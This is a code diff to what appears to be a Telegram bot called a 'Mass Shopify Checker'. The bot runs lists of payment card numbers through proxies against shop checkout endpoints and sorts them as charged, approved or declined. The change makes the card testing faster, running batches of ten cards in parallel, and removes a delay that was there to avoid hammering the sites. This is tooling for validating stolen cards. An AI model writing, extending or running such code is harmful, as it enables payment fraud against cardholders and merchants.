@@ -5548,7 +5548,7 @@ async def check_card(session: httpx.AsyncClient, base_url: str, site: str, card:
         site = "https://" + site
     url = f"{base_url}?site={site}&cc={card}&proxy={proxy}"
     try:
-        r = await session.get(url, timeout=25)
+        r = await session.get(url, timeout=55)
         try:
             data = r.json()
         except Exception:
@@ -5596,92 +5596,98 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
 
 # ---------- Runner ----------
 
+# ---------- Runner (fast parallel batching) ----------
+
 async def run_msp(update: Update, context: ContextTypes.DEFAULT_TYPE, cards: List[str], base_url: str, sites: List[str], msg) -> None:
-    # Always reset stop flag
     context.user_data["msp_stop"] = False
 
     approved = declined = errors = charged = checked = 0
     approved_results, charged_results, declined_results, error_results = [], [], [], []
 
     proxy = DEFAULT_PROXY
+    BATCH_SIZE = 10   # process 10 cards at once, adjust as needed
 
     async with httpx.AsyncClient() as session:
-        for card in cards:
+        for i in range(0, len(cards), BATCH_SIZE):
             if context.user_data.get("msp_stop"):
                 break
 
-            responses = await asyncio.gather(
-                *[check_card(session, base_url, site, card, proxy) for site in sites],
-                return_exceptions=False,
-            )
+            batch = cards[i:i + BATCH_SIZE]
 
-            scored: List[Tuple[Dict[str, str], int]] = []
-            for resp in responses:
-                resp_text = (resp.get("response") or "").strip()
-                resp_upper = resp_text.upper()
-                if any(k in resp_upper for k in CHARGED_KEYWORDS):
-                    score = 4
-                elif any(k in resp_upper for k in APPROVED_KEYWORDS):
-                    score = 3
-                elif any(k in resp_upper for k in DECLINED_KEYWORDS):
-                    score = 2
-                elif "ERROR" in resp_upper or "UNKNOWN" in resp_upper:
-                    score = 1
-                else:
-                    score = 0
-                scored.append((resp, score))
+            # run checks in parallel for this batch
+            all_responses = await asyncio.gather(*[
+                asyncio.gather(*[check_card(session, base_url, site, card, proxy) for site in sites])
+                for card in batch
+            ])
 
-            # Never drop everything – fallback to scored
-            valid_responses = [
-                item for item in scored
-                if not any(pat in (item[0].get("response") or "").upper() for pat in ERROR_PATTERNS)
-            ]
-            if not valid_responses:
-                valid_responses = scored
+            # process results of this batch
+            for card, responses in zip(batch, all_responses):
+                scored: List[Tuple[Dict[str, str], int]] = []
+                for resp in responses:
+                    resp_text = (resp.get("response") or "").strip()
+                    resp_upper = resp_text.upper()
+                    if any(k in resp_upper for k in CHARGED_KEYWORDS):
+                        score = 4
+                    elif any(k in resp_upper for k in APPROVED_KEYWORDS):
+                        score = 3
+                    elif any(k in resp_upper for k in DECLINED_KEYWORDS):
+                        score = 2
+                    elif "ERROR" in resp_upper or "UNKNOWN" in resp_upper:
+                        score = 1
+                    else:
+                        score = 0
+                    scored.append((resp, score))
 
-            chosen = max(valid_responses, key=lambda x: x[1])
-            resp, best_score = chosen
+                # fallback if all are errors
+                valid_responses = [
+                    item for item in scored
+                    if not any(pat in (item[0].get("response") or "").upper() for pat in ERROR_PATTERNS)
+                ]
+                if not valid_responses:
+                    valid_responses = scored
 
-            price_display = resp.get("price", "0")
-            try:
-                price_display = str(float(price_display))
-            except Exception:
-                pass
-            line_resp = (
-                f"Response: {resp.get('response','Unknown')}\n"
-                f"    Price: {price_display}\n"
-                f"    Gateway: {resp.get('gateway','N/A')}"
-            )
+                resp, best_score = max(valid_responses, key=lambda x: x[1])
 
-            resp_upper = (resp.get("response") or "").upper()
-            if "INSUFFICIENT_FUNDS" in resp_upper:
-                charged += 1
-                charged_results.append(f"🔥 {card}\n    {line_resp}")
-            elif any(k in resp_upper for k in APPROVED_KEYWORDS):
-                approved += 1
-                approved_results.append(f"✅ {card}\n    {line_resp}")
-            elif "INVALID_PAYMENT_ERROR" in resp_upper:
-                declined += 1
-                declined_results.append(f"❌ {card}\n    {line_resp}")
-            else:
-                if best_score == 4:
+                price_display = resp.get("price", "0")
+                try:
+                    price_display = str(float(price_display))
+                except Exception:
+                    pass
+                line_resp = (
+                    f"Response: {resp.get('response','Unknown')}\n"
+                    f"    Price: {price_display}\n"
+                    f"    Gateway: {resp.get('gateway','N/A')}"
+                )
+
+                resp_upper = (resp.get("response") or "").upper()
+                if "INSUFFICIENT_FUNDS" in resp_upper:
                     charged += 1
                     charged_results.append(f"🔥 {card}\n    {line_resp}")
-                elif best_score == 3:
+                elif any(k in resp_upper for k in APPROVED_KEYWORDS):
                     approved += 1
                     approved_results.append(f"✅ {card}\n    {line_resp}")
-                elif best_score == 2:
+                elif "INVALID_PAYMENT_ERROR" in resp_upper:
                     declined += 1
                     declined_results.append(f"❌ {card}\n    {line_resp}")
                 else:
-                    errors += 1
-                    error_results.append(f"⚠️ {card}\n    {line_resp}")
+                    if best_score == 4:
+                        charged += 1
+                        charged_results.append(f"🔥 {card}\n    {line_resp}")
+                    elif best_score == 3:
+                        approved += 1
+                        approved_results.append(f"✅ {card}\n    {line_resp}")
+                    elif best_score == 2:
+                        declined += 1
+                        declined_results.append(f"❌ {card}\n    {line_resp}")
+                    else:
+                        errors += 1
+                        error_results.append(f"⚠️ {card}\n    {line_resp}")
 
-            checked += 1
+                checked += 1
 
-            # live summary
+            # update Telegram only once per batch
             try:
-                buttons = build_msp_buttons(card, approved, charged, declined, update.effective_user.id)
+                buttons = build_msp_buttons(batch[-1], approved, charged, declined, update.effective_user.id)
                 summary_text = (
                     f"📊 𝙈𝙖𝙨𝙨 𝙎𝙝𝙤𝙥𝙞𝙛𝙮 𝘾𝙝𝙚𝙘𝙠𝙚𝙧\n"
                     f"━━━━━━━━━━━━━━━━━━━━━━━\n"
@@ -5704,9 +5710,6 @@ async def run_msp(update: Update, context: ContextTypes.DEFAULT_TYPE, cards: Lis
             except Exception as e:
                 logger.warning(f"Edit failed: {e}")
 
-            await asyncio.sleep(0.5)  # prevent hammering
-
-    # If nothing was processed, stop here
     if checked == 0:
         await update.message.reply_text("❌ No cards were processed. Try again later.")
         try:
